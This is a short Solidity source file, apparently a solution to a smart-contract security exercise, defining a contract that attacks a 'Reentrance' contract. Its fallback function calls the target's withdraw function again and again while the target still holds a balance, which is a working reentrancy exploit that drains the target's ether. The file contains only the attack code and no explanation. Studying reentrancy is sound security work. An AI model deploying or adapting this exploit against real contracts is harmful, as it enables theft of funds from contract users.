// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Reentrancy.sol";
contract ReentracyAttack{
  
    Reentrance target;
    constructor(address payable _contractAddress) public  {
        target = Reentrance(_contractAddress);

    }

    function donateToTarget(address to) public payable {

        target.donate(to);
    }

    fallback() external payable{
        if(address(target).balance != 0){

            target.withdraw(1 ether);
        }

    }



}